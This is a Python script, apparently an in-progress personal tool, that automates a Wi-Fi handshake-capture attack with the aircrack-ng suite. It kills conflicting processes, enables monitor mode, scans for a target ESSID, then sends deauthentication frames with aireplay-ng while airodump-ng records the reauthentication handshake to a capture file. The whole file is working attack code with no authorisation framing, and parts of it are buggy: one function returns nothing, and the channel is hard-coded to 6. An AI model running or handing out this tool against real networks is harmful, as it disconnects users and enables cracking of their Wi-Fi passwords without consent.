import argparse
import logging
import threading
import subprocess
import tempfile
import time
import os
import re
import signal
from pathlib import Path
from typing import Optional
import pty
import select
import sys
from typing import Optional, Dict, Any

def put_interface_in_same_channel(iface: str, channel: str):
    channel_message = "Putting interface in channel {channel}".format(channel = channel)
    print(channel_message)

    cmd = ["sudo", "airmon-ng", "stop", iface]
    iface_down_output = subprocess.run(cmd, capture_output=True, text=True)
    print(iface_down_output.stdout)

    cmd = ["sudo", "airmon-ng", "start", iface, channel]
    iface_up_output = subprocess.run(cmd, capture_output=True, text=True)
    print(iface_up_output.stdout)

def start_airodump(airodump_args, stop_event):
    cmd = ["sudo", "airodump-ng", "-w", airodump_args["cap_file_name"], "-c", str(airodump_args["channel"]), "--bssid", airodump_args["bssid"], airodump_args["interface"]]
    result = subprocess.run(cmd, capture_output=True, text=True)
    # while not stop_event.is_set():
    print(result.stdout)
    return
    
def send_deauths(aireplay_args, stop_event):
    # TODO: figure out how to get the channel to pass to this function
    put_interface_in_same_channel(aireplay_args["interface"], "6")
    
    cmd = ["sudo", "aireplay-ng", "--deauth", str(aireplay_args["deauths"]), "-a", aireplay_args["bssid"], aireplay_args["interface"]]
    result = subprocess.run(cmd, capture_output=True, text=True)

    # while not stop_event.is_set():
    print(result.stdout)
    return

def kill_conflicting_processes():
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True, text=True, check=True)

def enable_monitor_mode(iface: str) -> str:
    """
    Enable monitor mode on *iface* using airmon‑ng and
    return the resulting monitor‑mode interface name.

    If the interface is already in monitor mode (ends with 'mon'), it is returned unchanged.
    """
    if iface.endswith("mon"):
        return iface  # already monitor mode

    # airmon‑ng outputs something like:  (monitor mode enabled on wlan0mon)
    cmd = ["sudo", "airmon-ng", "start", iface]
    print("[*] Enabling monitor mode:", " ".join(cmd))
    result = subprocess.run(cmd, capture_output=True, text=True, check=True)
    print(result);

def find_network(
    essid: str,
    iface: str = "wlan0mon",
    timeout: Optional[int] = None
) -> Optional[Dict[str, Any]]:
    """
    Scan with airodump‑ng until *essid* appears and return its BSSID and channel.
    Returns: {"bssid": "<mac>", "channel": <int>}  or  None if not found/timeout.
    """
    print(f"Looking for ESSID: {essid}")
    print(f"Interface: {iface}")
    print(f"Timeout: {timeout if timeout else 'No timeout'} s")

    master_fd, slave_fd = pty.openpty()
    proc = subprocess.Popen(
        ["sudo", "airodump-ng", iface],
        stdout=slave_fd,
        stderr=subprocess.STDOUT,
        text=False          # raw bytes – we’ll decode ourselves
    )
    os.close(slave_fd)

    buf = ""
    start = time.time()
    ch_col = None          # index of the “CH” column once we spot the header

    try:
        while proc.poll() is None:
            if timeout and (time.time() - int(start)) > int(timeout):
                print("\nTimeout reached – stopping scan.")
                break

            ready, _, _ = select.select([master_fd], [], [], 0.5)
            if not ready:
                continue

            chunk = os.read(master_fd, 4096).decode(errors="replace")
            buf += chunk
            lines = buf.splitlines()

            for line in lines:
                # 1️⃣  Pin down the header once so we know where “CH” lives
                if ch_col is None and "BSSID" in line and "ESSID" in line and "CH" in line:
                    header = re.split(r"\s+", line.strip())
                    try:
                        ch_col = header.index("CH") + 1
                        # print(f"Header captured – CH is column {ch_col}")
                    except ValueError:
                        pass  # should not happen
                    continue

                # 2️⃣  Look for the target ESSID in each data row
                if essid in line and ch_col is not None:
                    parts = re.split(r"\s+", line.strip())

                    # Guard against short/garbled rows
                    if len(parts) <= ch_col:
                        continue

                    bssid = parts[0]
                    chan_str = parts[ch_col]

                    # Validate BSSID shape (aa:bb:cc:dd:ee:ff)
                    if re.fullmatch(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
                        # Channel can be ‘1’, ‘6’, ‘149’, etc.
                        if chan_str.isdigit():
                            channel = int(chan_str)
                        else:                         # strip odd suffixes (e.g. “6e”)
                            channel = int(re.sub(r"\D", "", chan_str) or -1)

                        print(f"\nFound '{essid}'  ➜  BSSID: {bssid} | CH: {channel}")
                        # proc.terminate()
                        # proc.wait()
                        return {"bssid": bssid, "channel": channel}

            # keep buffer from ballooning
            if len(buf) > 100_000:
                buf = buf[-10_000:]

    except KeyboardInterrupt:
        print("\nInterrupted by user.")
    finally:
        try:
            proc.terminate()
        except Exception:
            pass
        proc.wait()
        os.close(master_fd)

    print("ESSID not found.")
    return None

def main():
    # Create argument parser
    parser = argparse.ArgumentParser(
        description="Wi-Fi target capture tool using airodump-ng"
    )

    # Add named (optional-looking but required) arguments
    parser.add_argument("--target", required=True, help="Target network ESSID (e.g., 'MyWiFi')")
    parser.add_argument("--interface", required=True, help="Wireless interface in monitor mode (e.g., wlan0mon)")
    parser.add_argument("--capfile", required=True, help="Output capture file prefix (e.g., 'output-file')")

    # Parse the arguments
    args = parser.parse_args()

    # Log what we're doing
    logging.info("Target: %s", args.target)
    logging.info("Interface: %s", args.interface)
    logging.info("Capture File: %s", args.capfile)

    kill_conflicting_processes()
    enable_monitor_mode(args.interface)
    network_info = find_network(args.target, args.interface, "20")
    print(network_info)
    
    if network_info:
        stop_event = threading.Event()
        
        # In its own thread, send 20 deauths by default TODO: make this value a command line arg
        aireplay_args = { "interface": args.interface, "bssid": network_info["bssid"], "deauths": "20" }
        # deauth_thread = threading.Thread(target=send_deauths, args={aireplay_args, stop_event})
        
        
        # In second thread, capture the automatic reauthentication attempt
        airodump_args = { "cap_file_name": args.capfile, "channel": network_info["channel"], "bssid": network_info["bssid"], "interface": args.interface }
        # airodump_thread = threading.Thread(target=start_airodump, args={airodump_args, stop_event})

        deauth_thread = threading.Thread(target=send_deauths, args=(aireplay_args, stop_event))
        airodump_thread = threading.Thread(target=start_airodump, args=(airodump_args, stop_event))

        deauth_thread.start()
        airodump_thread.start()
        
        time.sleep(10)
        
        stop_event.set()
        deauth_thread.join()
        airodump_thread.join()
        

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format='[%(asctime)s] [%(levelname)s] %(message)s',
        datefmt='%H:%M:%S'
    )
    try:
        main()
    except KeyboardInterrupt:
        logging.info("User interrupted. Exiting …")
    except Exception as e:
        logging.error("Error: %s", e)
